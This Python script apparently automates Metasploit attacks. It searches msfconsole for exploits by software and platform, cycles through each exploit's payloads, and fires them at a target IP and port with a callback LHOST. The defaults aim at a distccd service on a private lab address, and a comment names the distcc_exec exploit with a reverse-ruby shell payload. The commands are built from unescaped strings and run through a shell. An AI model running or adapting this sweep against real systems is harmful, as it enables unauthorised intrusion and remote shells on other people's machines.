import re
import subprocess
import time
from typing import List
import termcolor

def check_platform(payloads: List[str], platform: str) -> List[str]:
    """
    The function filters the list of platforms, leaving only those in which
    the specified target platform is included.
    """
    filtered_payloads = [payload for payload in payloads if platform in payload]

    return filtered_payloads


def search_exploits(software: str, platform: str) -> List[str]:
    """Search for Metasploit exploits based on the specified software."""

    command = f"msfconsole -q -x \"search type:exploit {software} platform:{platform}; exit\""
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
    time.sleep(1)

    pattern = re.compile(r'exploit/[^ ]+')
    exploits = pattern.findall(result)
    exploits = exploits[:-1]

    return exploits


def search_payloads(exploit: str) -> List[str]:
    """Search for Metasploit payloads based on the specified software."""

    command = f"msfconsole -q -x \"use {exploit}; show payloads; exit\""
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
    time.sleep(1)

    pattern = re.compile(r'payload/[^ ]+')
    payloads = pattern.findall(result)

    return payloads


def exploit_vulnerabilities(exploits: List[str], target_ip: str, target_port: int, platform: str,
                            listen_lhost: str) -> None:
    """
    This function takes a list of exploits, target IP address, and target port number. It iterates over each exploit and
    payload, attempting exploitation. If the exploitation is successful, it prints information about the successful
    exploitation and the payload used.
    """

    for exploit in exploits:
        print(termcolor.colored(f"\nTrying exploit:  {exploit}", "magenta"))

        payloads = search_payloads(exploit)
        filtered_payloads = check_platform(payloads, platform)

        # Iterate over each payload for the current exploit
        for payload in filtered_payloads:
            print(termcolor.colored(f"Trying payload:  {payload}", "cyan"))

            command =f"msfconsole -q -x \"use {exploit}; set payload {payload}; set RHOSTS {target_ip}; set RPORT {target_port}; set LHOST {listen_lhost}; check; exit\""
            print("Trying command: ", command)

            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
                time.sleep(1)
            except subprocess.CalledProcessError as e:
                print(e.output)

            # if "Success" in result:
            #     print("Successful exploitation: ", exploit, ", Payload: ", payload)

            # print(f"\nresult ==> {result}\n")
            if "vulnerable" in result:
                print(termcolor.colored(f"[+] Successful exploitation:  {exploit}, Payload: {payload}\n{'- '*20}\n", "green"))


def run(ip, port, software, platform, listen_lhost):
    exploits = search_exploits(software, platform)
    exploit_vulnerabilities(exploits, ip, port, platform, listen_lhost)


if __name__ == '__main__':
    # exploit = 'exploit/unix/misc/distcc_exec'
    # payload = 'payload payload/cmd/unix/reverse_ruby'

    platform = "unix"  # aix, linux, multi, unix, windows, solaris, netware, android, ...

    target_ip = "10.0.2.4"
    target_port = "3632"
    listen_lhost = "10.0.2.5"
    soft_ware = "distccd"
    run(target_ip, target_port, soft_ware, platform, listen_lhost)
